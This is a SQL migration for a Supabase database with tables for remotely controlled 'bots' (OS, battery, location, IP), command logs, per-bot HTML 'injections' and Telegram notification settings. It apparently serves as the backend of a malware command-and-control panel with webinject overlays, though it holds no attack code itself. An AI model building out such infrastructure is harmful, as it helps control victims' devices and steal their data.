-- Create bots/devices table
CREATE TABLE public.bots (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID NOT NULL,
  name TEXT NOT NULL,
  model TEXT NOT NULL,
  os TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'offline',
  battery INTEGER DEFAULT 0,
  location TEXT,
  ip_address TEXT,
  last_seen TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Create servers table
CREATE TABLE public.servers (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID NOT NULL,
  name TEXT NOT NULL,
  url TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'inactive',
  type TEXT NOT NULL DEFAULT 'webhook',
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Create logs table
CREATE TABLE public.logs (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID NOT NULL,
  bot_id UUID REFERENCES public.bots(id) ON DELETE CASCADE,
  command TEXT NOT NULL,
  result TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Create injections table
CREATE TABLE public.injections (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID NOT NULL,
  bot_id UUID REFERENCES public.bots(id) ON DELETE CASCADE,
  html_content TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'pending',
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Create settings table
CREATE TABLE public.settings (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  user_id UUID NOT NULL UNIQUE,
  telegram_token TEXT,
  telegram_chat_id TEXT,
  notifications_enabled BOOLEAN DEFAULT false,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- Enable Row Level Security
ALTER TABLE public.bots ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.servers ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.injections ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.settings ENABLE ROW LEVEL SECURITY;

-- Create policies for bots
CREATE POLICY "Users can view their own bots" ON public.bots FOR SELECT USING (auth.uid() = user_id);
CREATE POLICY "Users can create their own bots" ON public.bots FOR INSERT WITH CHECK (auth.uid() = user_id);
CREATE POLICY "Users can update their own bots" ON public.bots FOR UPDATE USING (auth.uid() = user_id);
CREATE POLICY "Users can delete their own bots" ON public.bots FOR DELETE USING (auth.uid() = user_id);

-- Create policies for servers
CREATE POLICY "Users can view their own servers" ON public.servers FOR SELECT USING (auth.uid() = user_id);
CREATE POLICY "Users can create their own servers" ON public.servers FOR INSERT WITH CHECK (auth.uid() = user_id);
CREATE POLICY "Users can update their own servers" ON public.servers FOR UPDATE USING (auth.uid() = user_id);
CREATE POLICY "Users can delete their own servers" ON public.servers FOR DELETE USING (auth.uid() = user_id);

-- Create policies for logs
CREATE POLICY "Users can view their own logs" ON public.logs FOR SELECT USING (auth.uid() = user_id);
CREATE POLICY "Users can create their own logs" ON public.logs FOR INSERT WITH CHECK (auth.uid() = user_id);
CREATE POLICY "Users can delete their own logs" ON public.logs FOR DELETE USING (auth.uid() = user_id);

-- Create policies for injections
CREATE POLICY "Users can view their own injections" ON public.injections FOR SELECT USING (auth.uid() = user_id);
CREATE POLICY "Users can create their own injections" ON public.injections FOR INSERT WITH CHECK (auth.uid() = user_id);
CREATE POLICY "Users can delete their own injections" ON public.injections FOR DELETE USING (auth.uid() = user_id);

-- Create policies for settings
CREATE POLICY "Users can view their own settings" ON public.settings FOR SELECT USING (auth.uid() = user_id);
CREATE POLICY "Users can insert their own settings" ON public.settings FOR INSERT WITH CHECK (auth.uid() = user_id);
CREATE POLICY "Users can update their own settings" ON public.settings FOR UPDATE USING (auth.uid() = user_id);

-- Create function to update timestamps
CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

-- Create triggers for automatic timestamp updates
CREATE TRIGGER update_bots_updated_at BEFORE UPDATE ON public.bots FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();
CREATE TRIGGER update_servers_updated_at BEFORE UPDATE ON public.servers FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();
CREATE TRIGGER update_settings_updated_at BEFORE UPDATE ON public.settings FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();